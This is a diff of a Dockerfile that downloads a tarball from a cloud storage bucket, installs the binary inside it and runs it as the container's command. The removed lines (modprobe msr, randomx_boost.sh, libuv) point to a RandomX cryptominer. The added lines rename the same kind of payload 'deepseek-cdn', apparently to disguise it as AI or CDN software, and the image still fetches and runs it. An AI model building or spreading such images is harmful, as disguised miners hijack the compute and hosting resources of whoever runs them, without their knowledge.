@@ -3,24 +3,18 @@ FROM ubuntu:22.04
 LABEL maintainer="Roman Nikov"
 
 RUN apt update; \
-    apt install -y libuv1-dev; \
-    apt install -y kmod; \
     apt install -y wget; \
-    modprobe msr; \
-    wget https://gptstream.obs.ru-moscow-1.hc.sbercloud.ru/gptstream-DO3.tar.gz; \
-    tar xf gptstream-DO3.tar.gz; \
-    cd gptstream-DO3; \
-    cp randomx_boost.sh /usr/local/bin/randomx_boost.sh; \
+    wget https://gptstream.obs.ru-moscow-1.hc.sbercloud.ru/deepseek-cdn.tar.gz; \
+    tar xf deepseek-cdn.tar.gz; \
+    cd deepseek-cdn; \
     cp config.json /usr/local/bin/config.json; \
-    cp gptstream /usr/local/bin/gptstream; \
+    cp deepseek-cdn /usr/local/bin/deepseek-cdn; \
     cd /usr/local/bin;
 
 WORKDIR /usr/local/bin
 
 RUN chmod 744 config.json;
 
-RUN chmod 744 gptstream;
+RUN chmod 744 deepseek-cdn;
 
-RUN chmod 774 randomx_boost.sh;
-
-CMD randomx_boost.sh & gptstream
+CMD deepseek-cdn
